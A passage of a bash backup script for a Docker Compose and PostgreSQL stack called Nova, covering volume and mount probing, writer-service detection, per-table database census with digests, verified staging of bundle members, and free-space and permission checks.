      disp="$(cfg_anon_disposition "$anon_svc" "$anon_dest" < "$stage/facts/config.yaml" | cut -f1)"
      case "$disp" in
        include) ;;
        move-only) [ "$mode" = "move" ] || continue ;;
        *) continue ;;
      esac
      [ "$first" -eq 1 ] || printf ','
      first=0
      bk_probe_volume "$anon_name" "$anon_name" "$image" "$err"
    done <<EOF
$(bk_anon_mounts "$stage")
EOF
    [ "$first" -eq 1 ] || printf '\n  '
    printf '},\n  "files": {'
    # Every host path the git scan called `ignored` — the include-class half
    # of §6.3 step 6. A path SEGMENT_POLICY will drop is probed too; a stat
    # that costs nothing is cheaper than teaching the shell a table that lives
    # in python.
    first=1
    while IFS= read -r line; do
      [ -n "$line" ] || continue
      [ "$first" -eq 1 ] || printf ','
      first=0
      bk_probe_path "$line" "$root/$line"
    done <<EOF
$(bk_ignored_paths "$stage")
EOF
    # Every BIND the compose file declares as state to carry, keyed by its
    # resolved absolute source — the same key coverage looks it up by. A bind
    # is a host path like any other; what made it invisible before was that
    # this loop only knew about the git scan's paths.
    for svc in $(cfg_service_keys < "$stage/facts/config.yaml"); do
      # cfg_mounts emits: type, source, target, read_only, disposition, reason
      # — read by POSITION (bk_col), because an un-annotated mount leaves the
      # last two empty and a short-form anonymous volume leaves `source`
      # empty, and IFS word-splitting would shift every later field left.
      while IFS= read -r line; do
        [ "$(bk_col "$line" 1)" = "bind" ] || continue
        src="$(bk_col "$line" 2)"
        disp="$(bk_col "$line" 5)"
        case "$disp" in
          include) ;;
          move-only) [ "$mode" = "move" ] || continue ;;
          *) continue ;;
        esac
        [ "$first" -eq 1 ] || printf ','
        first=0
        bk_probe_path "$src" "$src"
      done <<EOF
$(cfg_mounts "$svc" < "$stage/facts/config.yaml")
EOF
    done
    [ "$first" -eq 1 ] || printf '\n  '
    printf '}\n}\n'
  } > "$out"
  bk_verify_fact "$out" "docker volume inspect + a find probe per carried source" "$err"
}

# The paths git.json called "ignored", read back out of the rendered fact so
# there is one walk and not two.
bk_ignored_paths() {
  local stage="$1"
  [ -f "$stage/facts/git.json" ] || return 0
  awk '
    /"paths"[ \t]*:/ { inpaths = 1; next }
    inpaths && /^  }/ { inpaths = 0 }
    inpaths && /: "ignored"/ {
      line = $0
      sub(/^[ \t]*"/, "", line)
      sub(/"[ \t]*:.*$/, "", line)
      print line
    }
  ' "$stage/facts/git.json"
}

# ── the dispatch the renderers need ─────────────────────────────────────────
#
# Order is not cosmetic: dispositions.json must exist before the git scan can
# derive its scan roots from the bind sources, and git.json must exist before
# reachability knows which host files are carried. `cmd_backup` calls this as
# its step 3, with nothing stopped yet.
render_facts() {
  local stage="$1" mode="${2:-routine}"
  mkdir -p "$stage/facts" || return 1
  BK_PROJECT=""
  render_raw "$stage" || return 1
  render_dispositions "$stage" || return 1
  # Primed HERE, in THIS shell and out of the render that just landed on
  # disk, so the `$(bk_project)` substitutions in the renderers below inherit
  # it instead of each running a whole `docker compose config` of their own.
  # After render_dispositions, so an unreadable render is still reported by
  # the renderer whose command it was.
  bk_set_project "$stage" || return 1
  render_config "$stage" || return 1
  render_containers "$stage" || return 1
  render_git "$stage" || return 1
  render_env "$stage" || return 1
  render_databases "$stage" || return 1
  render_reachable "$stage" "$mode" || return 1
}

# ── T3: the host facts only the shell can read ──────────────────────────────
#
# Everything below is `cmd_backup`'s. The split the header describes still
# holds: this file DECIDES, VERIFIES and REFUSES, and every byte of Nova's
# data is read by a container. What is new here is the host's own readings —
# the archive directory's mode, free space, who the writers are, which images
# are running — plus the orchestration that turns them into one bundle.

# One KEY=VALUE out of deploy/.env, without sourcing it: a .env is data, and
# sourcing data executes it. Deliberately a second copy of passphrase.sh's
# np_env_value rather than a shared one — backup.sh must keep working when
# only compose_read.sh is sourced beside it, and this reads no secret it
# would be wrong to read twice.
bk_env_value() {
  local key="$1" file line
  file="$(bk_env_file)"
  [ -f "$file" ] || return 0
  while IFS= read -r line || [ -n "$line" ]; do
    case "$line" in
      "$key"=*) printf '%s\n' "${line#*=}" ;;
    esac
  done < "$file" | tail -1
}

# Where bundles are written. NOVA_BACKUP_DIR in deploy/.env, else
# deploy/backups/, which .gitignore already carries.
bk_out_dir() {
  local configured
  configured="$(bk_env_value NOVA_BACKUP_DIR)"
  [ -n "$configured" ] || configured="$BK_DIR/backups"
  printf '%s\n' "$configured"
}

bk_moved_marker() { printf '%s\n' "${BK_MOVED_MARKER:-$BK_DIR/.moved}"; }
bk_moved_to_marker() { printf '%s\n' "${BK_MOVED_TO_MARKER:-$BK_DIR/tailscale/MOVED_TO}"; }

# The mode of a path, GNU or BSD. Neither form is portable alone; the pair is
# already at deploy/install_test.sh:266,317.
bk_mode_of() {
  stat -c '%a' "$1" 2>/dev/null || stat -f '%Lp' "$1" 2>/dev/null
}

# 64 hex, or a stated refusal. `sha256sum` on GNU, `shasum -a 256` on macOS
# (map-portability.md §2). NEVER a silent skip and never a partial answer: a
# bundle nobody hashed is a bundle nobody verified, and this is the function
# §9.1 step 19 runs AS THE OPERATOR to prove he can read what a root container
# wrote.
#
# `-` is stdin, which both forms accept. That is how the carried .env is
# hashed: its bytes hold every generated secret and must not touch the host
# filesystem to be measured.
sha256_of() {
  local path="$1" line out
  if command -v sha256sum >/dev/null 2>&1; then
    line="$(sha256sum "$path" 2>&1)" || {
      bk_fail "sha256sum could not read $path: $(printf '%s' "$line" | tr '\n' ' ')"
      return 1
    }
  elif command -v shasum >/dev/null 2>&1; then
    line="$(shasum -a 256 "$path" 2>&1)" || {
      bk_fail "shasum -a 256 could not read $path: $(printf '%s' "$line" | tr '\n' ' ')"
      return 1
    }
  else
    bk_fail "neither sha256sum nor \`shasum -a 256\` is on PATH, so nothing here can
       hash $path. A bundle nobody hashed is a bundle nobody verified."
    return 1
  fi
  out="${line%% *}"
  case "$out" in
    "" | *[!0-9a-f]*)
      bk_fail "hashing $path produced '$out', which is not 64 hex."
      return 1
      ;;
  esac
  if [ "${#out}" -ne 64 ]; then
    bk_fail "hashing $path produced ${#out} hex characters, not 64."
    return 1
  fi
  printf '%s\n' "$out"
}

# UTC and lexicographically sortable, which is what lets `drill` find the
# newest bundle without a portable `date -d` (macOS has none).
bk_stamp() { date -u +%Y%m%dT%H%M%SZ; }

# Second granularity, ISO-8601 UTC — the SAME frame docker's
# .State.FinishedAt reports in, so the two compare as strings and no date
# parsing is needed anywhere.
bk_now_iso() { date -u +%Y-%m-%dT%H:%M:%S; }

# "$1 >= $2" for two strings. bash 3.2's `[[ > ]]` is there but POSIX `test`
# has no `>`, and this file is also read by people porting it; one shape,
# stated once.
bk_str_ge() {
  [ "$(printf '%s\n%s\n' "$1" "$2" | LC_ALL=C sort | tail -1)" = "$1" ]
}

# nova-backup-<host>-<YYYYMMDDTHHMMSSZ>.tar (§5.1). The host name is reduced
# to a portable filename alphabet; the stamp carries no character that needs
# it, so `-<stamp>.tar` stays parseable.
archive_name() {
  printf 'nova-backup-%s-%s.tar\n' "$(printf '%s' "$1" | tr -c 'A-Za-z0-9._-' '-')" "$2"
}

# detect_disk_free_gb (deploy/install.sh:105-107) without its two divisions:
# bash `$(( ))` has no floats, so every ratio below is integer arithmetic and
# both sides are kilobytes (shell-first m2).
detect_disk_free_kb() {
  df -Pk "$1" 2>/dev/null | awk 'NR==2 {printf "%d", $4}'
}

# ── readers over the YAML render that only this verb needs ──────────────────
#
# The cfg_* family lives in compose_read.sh, which is driven against two
# compose versions' fixtures. These four are here because they are consumed
# by exactly one caller; they read the RENDER, which is already normalised
# (one mount shape, one depends_on shape), not the raw text the PyYAML parser
# owns (s41/rulings.md 2026-09-21).
#
# shellcheck disable=SC2154  # _CR_AWK_LIB is compose_read.sh's, sourced above

# The image compose asked for, for service $1. A built service has none.
bk_cfg_service_image() {
  awk "$_CR_AWK_LIB"'
    /^[A-Za-z_][A-Za-z0-9_-]*:/ { sect = cr_key($0); insvc = 0; next }
    sect != "services" { next }
    /^  [A-Za-z0-9._-]+:/ { insvc = (cr_key($0) == svc); next }
    insvc && !done && /^    image:/ { print cr_value($0, "image"); done = 1 }
  ' svc="$1"
}

# The real docker network name of compose network $1 — READ from the render,
# never assembled from <project>_<key>.
bk_cfg_network_name() {
  awk "$_CR_AWK_LIB"'
    /^[A-Za-z_][A-Za-z0-9_-]*:/ { sect = cr_key($0); inkey = 0; next }
    sect != "networks" { next }
    /^  [A-Za-z0-9._-]+:/ { inkey = (cr_key($0) == key); next }
    inkey && !done && /^    name:/ { print cr_value($0, "name"); done = 1 }
  ' key="$1"
}

# Every profile any rendered service names. The render is taken with
# --profile '*', so this is "every profile rendered" (§5.3 source.profiles).
bk_cfg_profiles() {
  awk "$_CR_AWK_LIB"'
    /^[A-Za-z_][A-Za-z0-9_-]*:/ { sect = cr_key($0); insvc = 0; sub_ = ""; next }
    sect != "services" { next }
    /^  [A-Za-z0-9._-]+:/ { insvc = 1; sub_ = ""; next }
    !insvc { next }
    /^    [A-Za-z0-9._-]+:/ { sub_ = cr_key($0); next }
    sub_ == "profiles" && /^      - / {
      line = $0; sub(/^      - /, "", line); print cr_unquote(line)
    }
  ' | sort -u
}

# Does service $1 write to postgres? shell-first M2, and it is not
# hypothetical: `gateway` mounts only v4_models read-write — an
# exclude-redownload volume — so under the mount rule alone it keeps running
# and keeps writing nova_gateway through its DATABASE_URL. One spend row
# between the census and the dump puts the dump a row ahead of the counts and
# step 11 then refuses a perfectly correct backup, at random, whenever the
# gateway is doing its job.
bk_service_touches_postgres() {
  awk "$_CR_AWK_LIB"'
    /^[A-Za-z_][A-Za-z0-9_-]*:/ { sect = cr_key($0); insvc = 0; sub_ = ""; next }
    sect != "services" { next }
    /^  [A-Za-z0-9._-]+:/ { insvc = (cr_key($0) == svc); sub_ = ""; next }
    !insvc { next }
    /^    [A-Za-z0-9._-]+:/ { sub_ = cr_key($0); next }
    sub_ == "depends_on" && /^      [A-Za-z0-9._-]+:/ {
      if (cr_key($0) == "postgres") found = 1
      next
    }
    sub_ == "depends_on" && /^      - / {
      line = $0; sub(/^      - /, "", line)
      if (cr_unquote(line) == "postgres") found = 1
      next
    }
    sub_ == "environment" && /postgresql:\/\/[^ ]*@postgres/ { found = 1; next }
    END { exit (found ? 0 : 1) }
  ' svc="$1"
}

# The database NAMES the rendered stack itself points at: every
# `postgresql://…@postgres[:port]/<db>` anywhere in the render, with the three
# names `render_databases`' own catalogue query excludes taken out again, so
# the two sets are comparable (§6.1's two sources, applied to databases).
#
# This is the SECOND source. The first is the catalogue — facts/databases.json
# — parsed into rows by bk_coverage_rows. Nothing compared them until the T3
# re-review dropped one row and watched a bundle carrying two databases of
# three publish and exit 0, while the identical injection on a VOLUME was
# refused by name. A hand-written parser that silently skips what its author
# did not anticipate cannot be the only thing standing between his stack and
# a bundle that is missing a tier of it.
bk_dsn_databases() {
  awk '
    {
      s = $0
      while (match(s, /postgresql:\/\/[^ \t"]*@postgres(:[0-9]+)?\/[A-Za-z0-9_]+/)) {
        tok = substr(s, RSTART, RLENGTH)
        s = substr(s, RSTART + RLENGTH)
        sub(/^.*\//, "", tok)
        # The same three the catalogue query excludes, so a DSN that names
        # the maintenance database does not read as a missing carried one.
        if (tok == "postgres" || tok == "template0" || tok == "template1") continue
        if (tok != "") print tok
      }
    }
  ' | LC_ALL=C sort -u
}

# The services this run must stop, derived from two facts in the render and
# `postgres` removed BY NAME (§9.1 step 7):
#   - a service mounting a volume THIS RUN CARRIES, read-write;
#   - a service that holds a postgres DSN or depends_on postgres.
#
# "this run carries" and not "include- or move-only": in routine mode a
# move-only volume is not read at all, and §9.5 states the four ways --move
# differs, the fourth being that `tailscale` joins the writer set. Taking
# step 7's wording literally would stop the tailnet sidecar on every routine
# backup — dropping the hub off the tailnet the operator reaches it by — to
# quiesce a volume that run never opens. See task-3-report.md.
writer_services() {
  local stage="$1" mode="${2:-routine}" yaml key disp carried svc hit line
  local mtype msrc mro
  yaml="$stage/facts/config.yaml"
  if [ ! -f "$yaml" ]; then
    bk_fail "the writer set is derived from $yaml and that render is not there."
    return 1
  fi

  carried=""
  for key in $(cfg_volume_keys < "$yaml"); do
    disp="$(cfg_volume_disposition "$key" < "$yaml" | cut -f1)"
    case "$disp" in
      include) ;;
      move-only) [ "$mode" = "move" ] || continue ;;
      *) continue ;;
    esac
    carried="$carried
$key"
  done

  for svc in $(cfg_service_keys < "$yaml"); do
    [ "$svc" = "postgres" ] && continue
    hit=0
    # By POSITION, never by IFS word-splitting: cfg_mounts leaves
    # `disposition` and `reason` empty for an un-annotated mount and leaves
    # `source` empty for a short-form anonymous volume, and tab is IFS
    # whitespace — so a null field used to shift every field after it and
    # this loop could read a TARGET where a source belongs. Same class as the
    # coverage-row defect, same fix.
    while IFS= read -r line; do
      mtype="$(bk_col "$line" 1)"
      [ "$mtype" = "volume" ] || continue
      mro="$(bk_col "$line" 4)"
      [ "$mro" = "true" ] && continue
      msrc="$(bk_col "$line" 2)"
      [ -n "$msrc" ] || continue
      bk_list_has "$carried" "$msrc" && hit=1
    done <<EOF
$(cfg_mounts "$svc" < "$yaml")
EOF
    if [ "$hit" -eq 0 ] && bk_service_touches_postgres "$svc" < "$yaml"; then
      hit=1
    fi
    # `if`, not `[ ... ] && printf`: an `&&` whose left side is false leaves
    # the LOOP's exit status at 1, and under the `set -o pipefail` that
    # install.sh runs with (deploy/install.sh:8) that makes the whole
    # `| sort -u` pipeline fail whenever the last service is not a writer —
    # which is every real stack, because `web` sorts last.
    if [ "$hit" -eq 1 ]; then
      printf '%s\n' "$svc"
    fi
  done | sort -u
}

# ── the two images, both READ off a running container ───────────────────────

# The image `novabundle.py` runs in: the already-built core image, read off
# core's own container. Never typed — an image this file named would be a
# different machine's Nova the day the tag moved.
pack_image() {
  local project id image
  project="$(bk_project)" || return 1
  id="$(bk_docker ps -a \
    --filter "label=com.docker.compose.project=$project" \
    --filter "label=com.docker.compose.service=core" \
    --format '{{.ID}}' 2>/dev/null | head -1)"
  if [ -z "$id" ]; then
    bk_fail "no container of this project carries the label
       com.docker.compose.service=core, so there is no core image to pack the
       bundle with. The pack image is READ off core's container, never typed:
       run ./install once on this host first."
    return 1
  fi
  image="$(bk_docker inspect "$id" --format '{{.Image}}' 2>/dev/null)"
  if [ -z "$image" ]; then
    bk_fail "docker inspect could not report the image of core's container $id."
    return 1
  fi
  printf '%s\n' "$image"
}

# What that image is CALLED — meta.json's `crypto_image`, which is the line
# restore.sh prints for `docker pull`. Read the same way.
pack_image_name() {
  local project id name
  project="$(bk_project)" || return 1
  id="$(bk_docker ps -a \
    --filter "label=com.docker.compose.project=$project" \
    --filter "label=com.docker.compose.service=core" \
    --format '{{.ID}}' 2>/dev/null | head -1)"
  [ -n "$id" ] || return 1
  name="$(bk_docker inspect "$id" --format '{{.Config.Image}}' 2>/dev/null)"
  [ -n "$name" ] || return 1
  printf '%s\n' "$name"
}

# The postgres image every throwaway pg container runs — the SAME image id the
# live server is running, so pg_dump can never be a different build from the
# server it is dumping.
pg_image() { bk_probe_image; }

# The id of this project's container for service $1, running only when $2 is
# "running". Empty when there is none; every caller refuses on empty rather
# than carrying on.
bk_container_id() {
  local svc="$1" want="${2:-any}" project args
  project="$(bk_project)" || return 1
  if [ "$want" = "running" ]; then
    args="ps"
  else
    args="ps -a"
  fi
  # shellcheck disable=SC2086  # $args is this function's own two literals
  bk_docker $args \
    --filter "label=com.docker.compose.project=$project" \
    --filter "label=com.docker.compose.service=$svc" \
    --format '{{.ID}}' 2>/dev/null | head -1
}

# ── talking to postgres ─────────────────────────────────────────────────────

# The six GUCs every digest in this bundle is measured under. They are pinned
# with SET LOCAL in the SAME STATEMENT as the measurement, because `t::text`
# renders timestamps, intervals, floats, bytea and numerics through them and
# every one of the six is settable per-database and per-role. A source pinning
# one set and a freshly initialised target pinning another produce different
# digests for identical data, and the restore would then refuse a good restore
# after the whole multi-GB extract (port-v3 m2, shell-first M9).
BK_SESSION_SQL="SET LOCAL TimeZone='UTC'; SET LOCAL DateStyle='ISO, MDY'; SET LOCAL IntervalStyle='postgres'; SET LOCAL extra_float_digits=0; SET LOCAL bytea_output='hex'; SET LOCAL lc_numeric='C';"

# The same six, as JSON for manifest.session. One source, two renderings.
bk_session_json() {
  printf '{"DateStyle": "ISO, MDY", "IntervalStyle": "postgres", "TimeZone": "UTC", "bytea_output": "hex", "extra_float_digits": "0", "lc_numeric": "C"}'
}

# psql inside the LIVE postgres container, over its own socket: no password
# crosses anything, and this is the same seam render_databases already uses.
# ON_ERROR_STOP is not tidiness — without it psql exits 0 after a failed
# statement and a failed census reads as an empty one.
bk_psql() {
  local id="$1" db="$2" sql="$3"
  bk_docker exec "$id" psql -U postgres -d "$db" -v ON_ERROR_STOP=1 -At -F'	' -c "$sql"
}

# A SQL identifier and a SQL literal, quoted the only way that is safe for a
# name that came out of the catalogue rather than out of this file.
bk_sql_ident() {
  local s="$1"
  printf '"%s"' "$(printf '%s' "$s" | sed 's/"/""/g')"
}
bk_sql_lit() {
  local s="$1"
  printf "'%s'" "$(printf '%s' "$s" | sed "s/'/''/g")"
}

# Every BASE TABLE in a non-system schema of database $2, as
# "<schema>.<table>", catalogue order.
bk_table_list() {
  local id="$1" db="$2"
  bk_psql "$id" "$db" \
    "SELECT table_schema, table_name FROM information_schema.tables WHERE table_type = 'BASE TABLE' AND table_schema NOT LIKE 'pg\\_%' AND table_schema <> 'information_schema' ORDER BY 1, 2" |
    awk -F'\t' 'NF >= 2 { printf "%s.%s\n", $1, $2 }'
}

# The census of database $2 on container $1: "<schema>.<table>\t<rows>\t<digest>"
# for every table, LC_ALL=C sorted (§5.2).
#
# The digest is a SUM, not md5(string_agg(…)). string_agg materialises the
# whole table as one `text` value and PostgreSQL's hard varlena limit is 1 GB;
# past it the query fails with `invalid memory alloc request size`, which lands
# in the same branch as an un-castable type — so once any table crosses roughly
# a gigabyte of text, EVERY backup refuses for ever and the only remedy is a
# code change. The sum form is constant-memory, needs no sort, is
# order-independent (which is exactly what a dump-and-restore comparison
# wants), and sum(bigint) returns numeric so it cannot overflow.
#
# coalesce(…, 0) is python-tool M2: the sum is NULL for an empty table and
# `psql -tAX` prints NULL as an empty string, indistinguishable from "no
# measurement" — so any zero-row table turned a healthy stack into a refused
# backup that sent the operator hunting a phantom.
bk_census() {
  local id="$1" db="$2" tables sql qname schema table out rows
  tables="$(bk_table_list "$id" "$db")" || {
    bk_fail "could not list the tables of $db: the catalogue query failed."
    return 1
  }
  if [ -z "$tables" ]; then
    bk_fail "$db reports no BASE TABLE in any non-system schema. A database with
       nothing in it is a reading that failed, not a database Nova stopped using."
    return 1
  fi
  if ! bk_list_has "$tables" "public.schema_migrations"; then
    bk_fail "$db has no public.schema_migrations, so nothing can say which migrations
       produced the rows this bundle carries."
    return 1
  fi

  sql="$BK_SESSION_SQL"
  while IFS= read -r qname; do
    [ -n "$qname" ] || continue
    schema="${qname%%.*}"
    table="${qname#*.}"
    sql="$sql SELECT $(bk_sql_lit "$qname"), count(*), coalesce(sum(('x'||substr(md5(t::text),1,16))::bit(64)::bigint), 0) FROM $(bk_sql_ident "$schema").$(bk_sql_ident "$table") AS t;"
  done <<EOF
$tables
EOF

  out="$(bk_psql "$id" "$db" "$sql")" || {
    bk_fail "the census of $db failed. Every table is measured or none is: a census
       that skipped a table is a bundle that cannot prove it carried it."
    return 1
  }
  rows="$(printf '%s\n' "$out" | sed '/^$/d' | awk -F'\t' 'NF == 3 && $2 != "" && $3 != ""' | wc -l | tr -d ' ')"
  if [ "$rows" != "$(printf '%s\n' "$tables" | sed '/^$/d' | wc -l | tr -d ' ')" ]; then
    bk_fail "$db catalogues $(printf '%s\n' "$tables" | sed '/^$/d' | wc -l | tr -d ' ') tables and the census produced $rows complete
       rows. A table that produced no count and no digest is a table this bundle
       cannot say it carried."
    return 1
  fi
  printf '%s\n' "$out" | sed '/^$/d' | LC_ALL=C sort
}

# ── the two container shapes ────────────────────────────────────────────────

# Every novabundle.py call, and the ONLY place the passphrase moves: the first
# line of THIS command's stdin. Never argv, never `-e` (which `docker inspect`
# would show for the container's whole lifetime), never a mounted file (§7.5).
# No docker socket — a mounted socket is root on the host and this design does
# not have one. --network none, because nothing here has anything to talk to.
# --user 0:0, because the staged tree holds postgres-owned files.
bk_nova() {
  bk_docker run --rm -i --network none --user 0:0 \
    -v "$BK_DIR/backup:/novabundle:ro" "$@"
}

# The passphrase generator create_passphrase is handed. A command, not a
# value: passphrase.sh holds no crypto, and the 160 bits come from
# secrets.token_bytes inside the image rather than from a command
# substitution that would drop NUL bytes (§7.2).
bk_genpass() {
  bk_nova "$BK_PACK_IMAGE" python3 /novabundle/novabundle.py genpass
}

# One throwaway of the postgres image the live server is running.
bk_pg_run() {
  bk_docker run --rm --user 0:0 "$@"
}

# Write stdin into the stage volume at /stage/$3. The host never mounts that
# volume, so the plaintext dumps, the carried .env values and the postgres
# password never touch the host filesystem (§9.1 step 10).
bk_stage_put() {
  local vol="$1" image="$2" rel="$3"
  bk_docker run --rm -i --network none --user 0:0 -v "$vol:/stage" \
    --entrypoint sh "$image" -ec '
      mkdir -p "$(dirname "/stage/$1")"
      umask 077
      cat > "/stage/$1"
    ' sh "$rel"
}

bk_stage_sha256() {
  local vol="$1" image="$2" rel="$3"
  bk_docker run --rm --network none --user 0:0 -v "$vol:/stage" \
    --entrypoint sh "$image" -ec 'sha256sum "/stage/$1" | cut -d" " -f1' sh "$rel"
}

# Stage stdin at /stage/$3 and PROVE what landed is what was sent — §9.1 step
# 13's "verifies each copy's sha256 equals the source's", for the members
# this shell builds rather than copies from a host path.
#
# bk_stage_put reads one thing: the exit status of a `docker run … cat >
# file`. Nothing hashed the result, so a member that arrived short then
# hashed CONSISTENTLY everywhere after it — the manifest, the payload
# self-verify, the shipped reader and `verify --bundle` all agreeing with
# each other about a file that is not what this shell sent. Measured on
# `env/carried.env`: three bytes landed, the run exited 0, the bundle
# published, and the report still said "5 of 7 keys carried". That member is
# how a restored hub rebuilds .env; three bytes means no POSTGRES_PASSWORD
# and a hub that cannot open its own databases.
#
# $4 is the sha256 of the bytes the caller is piping in.
bk_stage_put_verified() {
  local vol="$1" image="$2" rel="$3" want="$4" got
  bk_stage_put "$vol" "$image" "$rel" || {
    bk_fail "could not stage $rel into the bundle."
    return 1
  }
  got="$(bk_stage_sha256 "$vol" "$image" "$rel" | tr -d ' \n')"
  if [ "$got" != "$want" ]; then
    bk_fail "the member $rel did not arrive as it was sent: it hashes $want where it
       was built and '${got:-nothing}' inside the bundle. A member that lands short
       hashes consistently everywhere after this point — the manifest, the payload
       self-verify and the shipped reader would all agree with each other about a
       file that is not what this shell sent."
    return 1
  fi
  return 0
}

# ── reading the answers other things gave us ────────────────────────────────

# One field out of a compact json.dump line. The verbs below print one object
# on stdout and this is how the shell reads it; a field that is not there is a
# non-zero exit, never an empty string that reads as a value.
bk_json_field() {
  awk -v k="$1" '
    {
      n = index($0, "\"" k "\":")
      if (n == 0) next
      s = substr($0, n + length(k) + 3)
      sub(/^[ \t]*/, "", s)
      if (substr(s, 1, 1) == "\"") { s = substr(s, 2); sub(/".*$/, "", s) }
      else { sub(/[,}].*$/, "", s); sub(/[ \t]+$/, "", s) }
      print s
      found = 1
      exit
    }
    END { exit (found ? 0 : 1) }
  '
}

# coverage()'s OWN answer, as TSV:
#   kind \t name \t disposition \t full_name \t service \t target \t reason
# Read back out of novabundle.py's output rather than re-derived here, so what
# this verb carries and what coverage classified cannot disagree — the same
# reason `plan` derives the manifest from coverage's entries instead of being
# handed a list.
#
# The field separator is US (0x1f), not a tab. Tab is IFS WHITESPACE: `read`
# collapses a RUN of it, so `a\t\tb` reads as two fields and every field after
# an empty one shifts left. `full_name` is null for a bind, a path, an env key
# and a database, and the report printed the SERVICE where the name belongs
# until this was measured.
#
# The INDENTATION is the grammar, deliberately: cmd_coverage writes
# `json.dump(..., indent=2)`, so an entry object opens at exactly four spaces
# and its keys sit at exactly six. An entry may carry a nested `detail`
# object whose own list items open with a bare `{` at eight — a depth-blind
# reader takes one of those for a new row and drops most of the list, which
# is what this did on its first run (3 entries where there were 22). Matching
# the exact column cannot make that mistake, and cmd_backup refuses outright
# on an empty parse rather than carrying on with a short list.
bk_coverage_rows() {
  awk '
    function val(line,   s) {
      s = line
      sub(/^ *"[A-Za-z_]+": /, "", s)
      sub(/,$/, "", s)
      if (s == "null") return ""
      sub(/^"/, "", s); sub(/"$/, "", s)
      gsub(/\\"/, "\"", s); gsub(/\\\\/, "\\", s)
      return s
    }
    /^  "entries": \[/ { inlist = 1; next }
    !inlist { next }
    /^  \]/ { inlist = 0; next }
    /^    \{/ { kind = ""; name = ""; disp = ""; full = ""; svc = ""; tgt = ""; why = ""; inrow = 1; next }
    !inrow { next }
    /^      "kind": / { kind = val($0); next }
    /^      "name": / { name = val($0); next }
    /^      "disposition": / { disp = val($0); next }
    /^      "full_name": / { full = val($0); next }
    /^      "service": / { svc = val($0); next }
    /^      "target": / { tgt = val($0); next }
    /^      "reason": / { why = val($0); next }
    /^    \}/ {
      printf "%s\037%s\037%s\037%s\037%s\037%s\037%s\n", kind, name, disp, full, svc, tgt, why
      inrow = 0
      next
    }
  '
}

# The key NAMES in the live .env, and the ones .env.example declares `carry`.
# Both out of facts/env.json, which is the same fact coverage classified them
# from — one reading, one rule, no second list.
bk_env_keys() {
  awk '
    /"keys"[ \t]*:[ \t]*\[/ { ink = 1; next }
    ink && /^[ \t]*\]/ { ink = 0; next }
    ink {
      line = $0
      sub(/^[ \t]*"/, "", line); sub(/",?[ \t]*$/, "", line)
      if (line != "") print line
    }
  ' "$1"
}

bk_carry_keys() {
  local facts="$1" key
  for key in $(bk_env_keys "$facts/env.json"); do
    awk -v k="$key" '
      /"declarations"[ \t]*:/ { ind = 1; next }
      !ind { next }
      $0 ~ "^[ \t]*\"" k "\"[ \t]*:[ \t]*\"carry\"" { print k; exit }
    ' "$facts/env.json"
  done
}

# The work-tree root, read back out of the rendered fact so there is one walk
# and not two (the shape render_reachable already uses).
bk_git_root() {
  sed -n 's/^  "root": "\(.*\)",$/\1/p' "$1/git.json" | head -1
}

# ── the scratch database name, asserted three times ─────────────────────────
#
# ^nova_selftest_[0-9a-f]{8}$ is checked before CREATE, before pg_restore and
# before DROP — three independent assertions, the shape v3 landed on at
# backend/app/backup_restore.py:58-64,217,234,290. `nova_selftest_` and not
# `nova_verify_`: `drill`'s orphan sweep also walks `nova_verify_*`, and a
# drill started during a backup would try to drop the live run's scratch
# database and then report a failed drill for a healthy system (shell-first
# m11).
bk_assert_selftest_name() {
  local name="$1" what="$2" tail
  tail="${name#nova_selftest_}"
  if [ "nova_selftest_$tail" != "$name" ] || [ "${#tail}" -ne 8 ]; then
    bk_fail "refusing to $what a database called '$name': a self-test database is
       named ^nova_selftest_[0-9a-f]{8}\$ and nothing else. This check runs before
       the CREATE, before the pg_restore and before the DROP."
    return 1
  fi
  case "$tail" in
    *[!0-9a-f]*)
      bk_fail "refusing to $what a database called '$name': a self-test database is
       named ^nova_selftest_[0-9a-f]{8}\$ and nothing else."
      return 1
      ;;
  esac
  return 0
}

bk_selftest_name() {
  local hex
  hex="$(od -An -N4 -tx1 /dev/urandom 2>/dev/null | tr -d ' \n')"
  if [ "${#hex}" -ne 8 ]; then
    bk_fail "could not read 4 random bytes for the self-test database name."
    return 1
  fi
  printf 'nova_selftest_%s\n' "$hex"
}

# ── free space, in kilobytes, with no floats anywhere ───────────────────────
#
# FOUR copies of what is carried, not two: the run holds the staging tree,
# inner.tgz, payload.enc, the .part, and the round trip's streamed re-read
# (python-tool minor 4, which counted the same five and called 2x an
# under-count).
bk_need_out_kb() { printf '%s\n' "$(( $1 * 400 / 100 ))"; }
# Step 11's self-test restore writes a full second copy of every database onto
# PGDATA's filesystem, not onto $OUT (port-v3 M6).
bk_need_pgdata_kb() { printf '%s\n' "$(( $1 * 120 / 100 ))"; }

# `tr -dc '0-9'` deletes anything that is not a digit, which silently WELDS a
# decimal number into a huge integer: postgres returned `31933.067382812500`
# and the caller read `31933067382812500` — a trillion times the real size —
# and refused a backup on a disk with 800 GB free. Measured on the first real
# run, 2026-09-22. A sanitiser that corrupts is worse than one that refuses.
bk_digits_or_fail() {
  case "$1" in
    "" | *[!0-9]*)
      bk_fail "$2 answered \`$1\`, which is not a whole number. Refusing to guess
       what it meant."
      return 1
      ;;
  esac
  printf '%s\n' "$1"
}

bk_volume_du_kb() {
  bk_docker run --rm --network none --user 0:0 -v "$1:/src:ro" \
    --entrypoint sh "$2" -ec 'du -sk /src | cut -f1'
}

bk_pgdata_free_kb() {
  bk_docker exec "$1" df -Pk /var/lib/postgresql/data 2>/dev/null |
    awk 'NR==2 {printf "%d", $4}'
}

# ── the archive directory probe, ON THE HOST (#25, #26) ─────────────────────
#
# On the host and not in the container: a container's view of a bind-mounted
# host directory is synthesised by the file-sharing layer, so a chmod+stat
# round trip INSIDE a container can succeed on a host filesystem that cannot
# hold the mode — which is exactly the NTFS/exFAT/CIFS case this exists for
# (python-tool M11). This replaces the hardcoded /mnt/[a-z]/ regex: it asks
# the filesystem instead of guessing from a path.
bk_mode_probe() {
  local dir="$1" probe mode
  if ! mkdir -p "$dir" 2>/dev/null; then
    bk_fail "could not create the archive directory $dir."
    return 1
  fi
  chmod 700 "$dir" 2>/dev/null
  probe="$dir/.nova-mode-probe.$$"
  rm -f "$probe"
  if ! : > "$probe" 2>/dev/null; then
    bk_fail "could not write $probe, so nothing here can say whether $dir holds
       owner-only permissions."
    return 1
  fi
  chmod 600 "$probe" 2>/dev/null
  mode="$(bk_mode_of "$probe")"
  rm -f "$probe"
  if [ -z "$mode" ]; then
    bk_fail "neither \`stat -c '%a'\` nor \`stat -f '%Lp'\` could read the mode of a file
       in $dir. The bundle carries every secret this machine has, so it is not
